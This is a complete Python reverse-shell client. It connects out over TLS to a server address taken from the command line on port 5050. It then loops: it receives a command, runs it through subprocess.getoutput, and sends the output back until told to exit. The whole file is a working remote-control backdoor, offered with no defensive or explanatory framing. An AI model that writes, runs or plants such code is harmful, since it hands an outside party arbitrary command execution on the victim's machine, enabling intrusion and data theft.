import socket
import subprocess
import sys
import ssl

# constants
SERVER_HOST = sys.argv[1] # "0.0.0.0" for localhost
SERVER_PORT = 5050
BUFFER_SIZE = 1024

# create socket object and connect
s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
ssl_sock = ssl.wrap_socket(s, cert_reqs=ssl.CERT_REQUIRED, ca_certs='openssl/cert.crt')
def main():
    while True:
        # receive command from server
        command = ssl_sock.recv(BUFFER_SIZE).decode('ISO-8859-1')

        if command.lower() == "exit":
            break

        # execute command and retrieve results
        output = subprocess.getoutput(command)

        # send results back to server if any
        ssl_sock.send(output.encode('ISO-8859-1'))

    ssl_sock.close()

if __name__ == "__main__":
    main()